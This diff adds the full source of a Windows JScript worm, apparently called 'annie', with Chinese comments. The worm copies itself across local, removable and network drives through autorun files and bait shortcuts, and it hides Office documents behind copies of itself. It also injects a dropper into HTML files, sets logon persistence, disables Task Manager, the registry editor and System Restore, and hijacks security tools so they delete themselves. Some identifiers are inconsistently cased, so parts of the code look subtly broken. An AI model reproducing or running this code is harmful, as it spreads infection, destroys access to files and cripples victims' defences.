@@ -1,0 +1,427 @@
+var Fso = new ActiveXObject('Scripting.FileSystemObject');
+var Shell = new ActiveXObject('WScript.Shell');
+var ScriptPath = WScript.ScriptFullName;
+var Script = ReadText(ScriptPath);
+var SystemPath = fso.GetSpecialFolder(1);
+var SysPath = SystemPath + '\\drivers\\annie.sys';
+
+function InfectDrives() {
+    while (ScriptPath == SysPath) {
+        // 枚举驱动器集合
+        var e = new Enumerator(fso.Drives);
+        for (e.moveFirst(); !e.atEnd(); e.moveNext()) {
+            var drv = e.item();
+            // DriveType:UnknownType＝0；Removable＝1；Fixed=2；Remote=3；CDRom=4.
+            // 如果是硬盘或者移动存储介质并且驱动器号不为'A:'并且驱动器可以访问
+            if (((drv.DriveType == 1 || drv.DriveType == 2) && drv.Path != 'A:') && drv.IsReady) {
+                // 拷贝脚本文件到驱动器根目录，命名为annie.ani。
+                CopyScriptFile(drv.Path + '\\annie.ani');
+                // 创建AutoRun文件，将annie.ani设置为自动运行。
+                CreateAutoRunFile(drv.Path + '\\autorun.inf');
+                CreateShortcut(drv.Path + '\\');
+                InfectFolder(drv.Path + '\\');
+                InfectSubFolder(drv.Path + '\\');
+            }
+        }
+    }
+}
+
+function GetExtensionName(filename) {
+    return fso.GetExtensionName(filename).toLowerCase();
+}
+
+function TryOpenTheOriginalFile() {
+    var path = ScriptPath.substr(0, ScriptPath.length - 4);
+    if (fso.FileExists(path + '.docx')) {
+        OpenTheOriginalFile(path, '.docx');
+    } else if (fso.FileExists(path + '.doc')) {
+        OpenTheOriginalFile(path, '.doc');
+    } else if (fso.FileExists(path + '.rtf')) {
+        OpenTheOriginalFile(path, '.rtf');
+    }
+}
+
+function Install() {
+    shell.run('cscript.exe //e:jscript ' + SysPath + ' /r', 0);
+    WScript.Sleep(100);
+    shell.run('cscript.exe //e:jscript ' + SysPath + ' /s', 0);
+    WScript.Sleep(100);
+    shell.Run('cscript.exe //e:jscript ' + SysPath + ' /n', 0);
+}
+
+function GetFileSize(filename) {
+    if (fso.FileExists(filename)) {
+        return fso.GetFile(filename).Size;
+    } else {
+        return null;
+    }
+}
+
+function GetBaseName(filepath) {
+    return fso.GetBaseName(filepath);
+}
+
+function GetDocType(filepath) {
+// 获取html文件第一行文件类型说明
+    try {
+        return fso.OpenTextFile(filepath, 1).ReadLine();
+    } catch (e) {
+        return null;
+    }
+}
+
+function TestAndRepair() {
+    if (GetFileSize(SysPath) != 9201) {
+        CopyScriptFile(SysPath);
+        shell.Run('wscript.exe //e:jscript ' + SysPath + ' /e');
+    }
+}
+
+function CreateAutoRunFile(filename) {
+    var str = '[autorun]\nshellexecute=wscript.exe //e:jscript annie.ani /a\nshell\\open\\command=wscript.exe //e:jscript annie.ani /a\nshell\\explore\\command=wscript.exe //e:jscript annie.ani /a';
+    if (ReadText(filename) != str) {
+        SetFileNewAttributes(filename, 0);
+        try {
+            var f = fso.CreateTextFile(filename, true);
+            f.Write(str);
+            f.Close();
+        } catch (e) {
+            if (fso.FolderExists(filename)) {
+                DeleteFolder(filename);
+                CreateAutoRunFile(filename);
+            }
+        } finally {
+            SetFileNewAttributes(filename, 39);
+        }
+    }
+}
+
+function ReadText(filename) {
+    try {
+        return fso.OpenTextFile(filename, 1).ReadAll();
+    } catch (e) {
+        return '';
+    }
+}
+
+
+function SetFileNewAttributes(filename, newattributes) {
+// newattributes 可用值
+// 常数          值     描述
+// Normal        0      普通文件。没有设置任何属性。
+// ReadOnly      1      只读文件。可读写。
+// Hidden        2      隐藏文件。可读写。
+// System        4      系统文件。可读写。
+// Directory     16     文件夹或目录。只读。
+// Archive       32     上次备份后已更改的文件。可读写。
+// Alias         1024   链接或快捷方式。只读。
+// Compressed    2048   压缩文件。只读。
+    if (fso.FileExists(filename)) {
+        try {
+            var f = fso.GetFile(filename);
+            f.Attributes = newattributes ;
+        } catch (e) {}
+    }
+}
+
+function ChangeJseRge(item) {
+// 修改.JSE文件的默认值、默认图标等注册表信息
+    shell.RegWrite('HKCR\\' + RegReadItem('.JSE') + '\\', RegReadItem(RegReadItem(item) + '\\'));
+    shell.RegWrite('HKCR\\' + RegReadItem('.JSE') + '\\DefaultIcon\\', RegReadItem(RegReadItem(item) + '\\DefaultIcon\\'));
+    shell.RegWrite('HKCR\\' + RegReadItem('.JSE') + '\\FriendlyTypeName', RegReadItem(RegReadItem(item) + '\\'), 'REG_EXPAND_SZ');
+}
+
+function OpenTheOriginalFile(path, file_type) {
+    try {
+        var open_command = RegReadItem(RegReadItem(file_type) + '\\shell\\Open\\command');
+        if (open_command.match(/%1/) != null) {
+            shell.Run(open_command.replace('%1', path + file_type));
+        } else {
+            shell.Run(open_command + ' "' + path + file_type + '"');
+        }
+    } catch (e) {}
+}
+
+function HideAndDisguise() {
+    while (ScriptPath == SysPath) {
+        CopyScriptFile(SysPath);
+        InfectCDBuring();
+        InfectReg();
+        DisguiseJse();
+        WScript.Sleep(1000);
+    }
+}
+
+function DisguiseJse() {
+// 修改.jse文件的注册表信息进行伪装
+    try {
+        ChangeJseReg('.docx');
+    } catch (e) {
+        try {
+            ChangeJseReg('.doc');
+        } catch (e) {
+            try {
+                ChangeJseReg('.rtf');
+            } catch (e) {}
+        }
+    }
+}
+
+function InfectSubFolder(path) {
+    // 枚举子目录
+    var e = new Enumerator(fso.GetFolder(path).SubFolders);
+    for (e.moveFirst(); !e.atEnd(); e.moveNext()) {
+        var folder = e.item();
+        // GetSpecialFolder(0) 返回WindowsFolder路径
+        if ((folder.Name != 'RECYCLER' && folder.Name != 'System Volume Information') && folder.Path != fso.GetSpecialFolder(0)) {
+            InfectFolder(folder.Path);
+            InfectSubFolder(folder.Path);
+        }
+    }
+}
+
+function CreateShortcut(path) {
+    for (var i = 1; i <= 5; i++) {
+        var lnkname = path + 'beautiful_girl_part_' + i + '.lnk';
+        if (!fso.FileExists(lnkname)) {
+            try {
+                var shortcut = shell.CreateShortcut(lnkname);
+                shortcut.IconLocation = 'wmploc.dll,8';
+                shortcut.TargetPath = 'wscript.exe';
+                shortcut.Arguments = '//e:jscript annie.ani ' + '/q:' + i;
+                shortcut.Save();
+            } catch (e) {}
+        }
+    }
+}
+
+function EditHTML(filepath) {
+    var str = '<!--[ANNIE83E333BF08546819]-->';
+    if (GetDocType(filepath) != str) {
+        var text = ReadText(filepath);
+        // 所有斜线替换成双斜线
+        var ki4io = script.replace(/\\/g, '\\\\');
+        // 所有单引号替换为带转义字符的单引号
+        var v0l9m = ki4io.replace(/\'/g, '\\\'');
+        // 将脚本插入html代码中
+        var html = '<html>\n<script type="text/javascript">\n<!--\nvar ayfp6=new ActiveXObject(\'Scripting.FileSystemObject\');var dk5h8=new ActiveXObject(\'WScript.Shell\');var s41k8=ayfp6.GetSpecialFolder(2);var bgw3u=ayfp6.GetTempName();var vlx8c=\'' + v0l9m + '\'+String.fromCharCode(0);var rwyg5=ayfp6.CreateTextFile(s41k8+\'\\\\\'+bgw3u,true);rwyg5.Write(vlx8c);rwyg5.Close();dk5h8.Run(\'wscript.exe //e:jscript \'+s41k8+\'\\\\\'+bgw3u+\' /t\');\n//-->\n</script>\n</html>';
+        SetFileNewAttributes(filepath, 0);
+        try {
+            // 将生成的DocType标志及HTML代码加入到原文件中
+            var file = fso.OpenTextFile(filepath, 2);
+            file.WriteLine(str);
+            file.WriteLine(text);
+            file.WriteLine(html);
+            file.Close();
+        } catch (e) {}
+    }
+}
+
+function InfectFolder(path) {
+    // 枚举路径下文件
+    var e = new Enumerator(fso.GetFolder(path).Files);
+    for (e.moveFirst(); !e.atEnd(); e.moveNext()) {
+        var filepath = e.item().Path;
+        // 如果扩展名为'doc'、'docx'、'ref'并且文件没有打开
+        if ((GetExtensionName(filepath) == 'doc' || GetExtensionName(filepath) == 'docx' || GetExtensionName(filepath) == 'rtf') && GetBaseName(filepath).substr(0, 2) != '~$') {
+            // 拷贝脚本文件路径下，文件名为已存在office文件名，扩展名为'.jse'
+            CopyScriptFile(path + '\\' + GetBaseName(filepath) + '.jse');
+            // 隐藏原文件
+            SetFileNewAttributes(filepath, 38);
+        } else if (GetExtensionName(filepath) == 'htm' || GetExtensionName(filepath) == 'html') { // 如果扩展名为'htm' 或 'html'
+            // 编辑HTML文件，将脚本代码插入进去
+            EditHTML(filepath);
+        }
+        WScript.Sleep(4);
+    }
+}
+
+function RegReadItem(item) {
+    return shell.RegRead('HKCR\\' + item + '\\');
+}
+
+function InfectNetworkDrives() {
+    while (ScriptPath == SysPath) {
+        try {
+            var network = new ActiveXObject('WScript.Network');
+            var e = network.EnumNetworkDrives();
+            for (var i = 1; i < e.length; i += 2) {
+                CopyScriptFile(e.Item(i) + '\\annie.ani');
+                CreateShortcut(e.Item(i) + '\\');
+                InfectFolder(e.Item(i) + '\\');
+            }
+        } catch (e) {}
+        WScript.Sleep(900000);
+    }
+}
+
+function CopyScriptFile(filename) {
+    // 如果文件大小不为9201
+    if (GetFileSize(filename) != 9201) {
+        // 设置文件属性为Normal
+        SetFileNewAttributes(filename, 0);
+        try {
+            // 尝试重写文件
+            var f = fso.CreateTextFile(filename, true);
+            f.Write(script);
+            f.Close();
+        } catch (e) {   // 如果重写失败
+            // 如果文件路径为文件夹
+            if (fso.FolderExists(filename)) {
+                // 删除文件夹
+                DeleteFolder(filename);
+                // 重新拷贝脚本文件
+                CopyScriptFile(filename);
+            }
+        } finally {
+            // 如果文件扩展名不为'jse'
+            if (GetExtensionName(filename) != 'jse') {
+                // 设置文件属性为 'ReadOnly | Hidden | System | Archive'
+                SetFileNewAttributes(filename, 39);
+            }
+        }
+    }
+}
+
+function InfectCDBuring() {
+    try {
+        var e9hgn = shell.RegRead('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\CD Burning');
+        CopyScriptFile(e9hgn + '\\annie.ani');
+        CreateAutoRunFile(e9hgn + '\\autorun.inf');
+    } catch (e) {}
+}
+
+function DeleteFolder(filename) {
+    try {
+        fso.DeleteFolder(filename, true);
+    } catch (e) {
+        shell.Run('cmd.exe /c rd /s /q \\\\.\\"' + filename + '"', 0, true);
+    }
+}
+
+function InfectReg() {
+    try {
+        // 删除右键打开方式
+        shell.RegDelete('HKCR\\*\\shellex\\ContextMenuHandlers\\Open With\\');
+    } catch (e) {}
+    try {
+        // 修改'.inf'文件安装方式，安装配置文件时删除配置文件
+        shell.RegWrite('HKCR\\' + RegReadItem('.inf') + '\\shell\\Install\\command\\', 'cmd.exe /c del /q /f "%1"', 'REG_EXPAND_SZ');
+    } catch (e) {}
+    try {
+        // 修改'.jse'文件的打开方式
+        shell.RegWrite('HKCR\\' + RegReadItem('.JSE') + '\\Shell\\Edit\\Command\\', RegReadItem(RegReadItem('.JSE') + '\\Shell\\Open\\Command\\'), 'REG_EXPAND_SZ');
+    } catch (e) {}
+    try {
+        shell.RegDelete('HKCR\\' + RegReadItem('.JSE') + '\\Shell\\Open2\\');
+    } catch (e) {}
+    try {
+        shell.RegDelete('HKCR\\' + RegReadItem('.JSE') + '\\Shell\\Open2\\Command\\');
+    } catch (e) {}
+    try {
+        shell.RegDelete('HKCR\\' + RegReadItem('.JSE') + '\\ShellEx\\PropertySheetHandlers\\WSHProps\\');
+    } catch (e) {}
+    try {
+        // 修改'.reg'文件的打开方式，打开即删除
+        shell.RegWrite('HKCR\\' + RegReadItem('.reg') + '\\shell\\open\\command\\', 'cmd.exe /c del /q /f "%1"', 'REG_EXPAND_SZ');
+    } catch (e) {}
+    try {
+        // 禁止用户修改文件属性
+        shell.RegWrite('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoFileAssociate', '1', 'REG_DWORD');
+    } catch (e) {}
+    try {
+        // 禁用注册表编辑器
+        shell.RegWrite('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableRegistryTools', '1', 'REG_DWORD');
+    } catch (e) {}
+    try {
+        // 禁用任务管理器
+        shell.RegWrite('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr', '1', 'REG_DWORD');
+    } catch (e) {}
+    try {
+        // 禁用组策略管理器
+        shell.RegWrite('HKCU\\Software\\Policies\\Microsoft\\MMC\\RestrictToPermittedSnapins', '1', 'REG_DWORD');
+    } catch (e) {}
+    try {
+        // 映像劫持attrib.exe，不回显信息
+        shell.RegWrite('HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\attrib.exe\\Debugger', 'cmd.exe /c rem');
+    } catch (e) {}
+    try {
+        // 映像劫持autoruns.exe，启动即删除
+        shell.RegWrite('HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\autoruns.exe\\Debugger', 'cmd.exe /c del /q /f');
+    } catch (e) {}
+    try {
+        // 映像劫持procexp.exe，启动即删除
+        shell.RegWrite('HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procexp.exe\\Debugger', 'cmd.exe /c del /q /f');
+    } catch (e) {}
+    try {
+        // 映像劫持reg.exe，不回显信息
+        shell.RegWrite('HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\reg.exe\\Debugger', 'cmd.exe /c rem');
+    } catch (e) {}
+    try {
+        // 映像劫持RegAlyzer.exe，启动即删除
+        shell.RegWrite('HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\RegAlyzer.exe\\Debugger', 'cmd.exe /c del /q /f');
+    } catch (e) {}
+    try {
+        // 映像劫持taskkill.exe,不回显信息
+        shell.RegWrite('HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskkill.exe\\Debugger', 'cmd.exe /c rem');
+    } catch (e) {}
+    try {
+        // 创建自启动项
+        shell.RegWrite('HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit', SystemPath + '\\userinit.exe,wscript.exe //e:jscript ' + SysPath + ' /e');
+    } catch (e) {}
+    try {
+        // 隐藏文件后缀
+        shell.RegWrite('HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\HideFileExt\\UncheckedValue', '1', 'REG_DWORD');
+    } catch (e) {}
+    try {
+        // 强制隐藏文件
+        shell.RegWrite('HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\SuperHidden\\UncheckedValue', '0', 'REG_DWORD');
+    } catch (e) {}
+    try {
+        // 禁用系统还原
+        shell.RegWrite('HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\\DisableConfig', '1', 'REG_DWORD');
+    } catch (e) {}
+    try {
+        // 禁用系统还原
+        shell.RegWrite('HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\\DisableSR', '1', 'REG_DWORD');
+    } catch (e) {}
+}
+
+function Main() {
+    var args = WScript.Arguments;
+    if (GetExtensionName(ScriptPath) != 'jse' && args.length > 0) {
+        switch (args.Item(0)) {
+            case '/e':
+                Install();
+                break;
+            case '/r': // 隐藏和伪装自身
+                HideAndDisguise();
+                break;
+            case '/s': // 感染驱动器
+                InfectDrives();
+                break;
+            case '/n': // 感染网络驱动器
+                InfectNetworkDrives();
+                break;
+            case '/t': // 自检后删除当前脚本
+                TestAndRepair();
+                shell.Run('cmd /c del /q /f ' + ScriptPath, 0);
+                break;
+            case '/a': // 自检后以explorer静默执行当前脚本
+                TestAndRepair();
+                shell.Run('explorer.exe /e,/select,' + ScriptPath);
+                break;
+            default:
+                TestAndRepair();
+                try {
+                    // 播放个漂亮姑娘.avi，萌萌哒
+                    shell.Run('wmplayer.exe "' + ScriptPath.substr(0, ScriptPath.length - 9) + 'beautiful_girl_part_' + args.Named.Item('q') + '.avi');
+                } catch (e) {}
+        }
+    } else {
+        TestAndRepair();
+        TryOpenTheOriginalFile();
+    }
+}
+
+Main();
